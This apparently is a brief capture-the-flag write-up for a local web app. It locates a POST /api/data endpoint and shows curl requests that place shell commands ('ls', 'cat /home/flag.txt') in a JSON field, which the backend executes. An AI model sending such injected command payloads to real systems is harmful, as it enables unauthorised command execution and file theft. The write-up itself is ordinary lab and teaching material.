# Project Writeup

## 1. Spot the api request to the backend
The first step is to find the api request to the backend. This can be done by opening the developer tools in the browser and looking at the network tab. The request to the backend is a POST request to the `/api/data` endpoint. There is a get an a post method in the frontend code, but the post method is the one that is used to send the data to the backend. So the fully request is `http://localhost:5000/api/data`.

## 2. Find the data that is sent to the backend
The next step is to find the data that is sent to the backend. This can be done by looking at the request payload in the developer tools. The data that is sent to the backend is a JSON object with the following structure:
```json
{
  "data": "some data"
}
```

## 3. Prepare the payload with curl
To request the backend try run the following command:
```bash
curl -X POST http://localhost:5000/api/data -H "Content-Type: application/json" -d '{"data": "ls"}'
```
it will return the following response:
```json
{
  "data": "content of the current directory"
}
```

## 4. Get the flag
To get the flag, we can run the following command:
```bash
curl -X POST http://localhost:5000/api/data -H "Content-Type: application/json" -d '{"data": "cat /home/flag.txt"}'
```


